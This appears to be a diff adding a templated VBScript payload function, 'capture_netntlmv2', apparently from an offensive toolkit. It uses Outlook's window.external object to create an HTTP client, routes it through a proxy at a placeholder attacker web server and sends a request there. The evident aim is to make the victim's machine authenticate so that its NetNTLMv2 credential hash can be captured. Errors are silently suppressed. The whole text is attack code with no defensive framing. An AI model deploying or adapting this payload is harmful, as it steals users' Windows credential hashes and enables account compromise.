@@ -1,0 +1,8 @@
+Function capture_netntlmv2()
+    On Error Resume Next
+    Set oHTTP = window.external.OutlookApplication.CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    oHTTP.SetProxy 2, {{ webserver_address }}, "*"
+    oHTTP.setRequestHeader "User-Agent", {{ useragent }}
+    oHTTP.open "GET", {{ url }}, False
+    oHTTP.send
+End Function
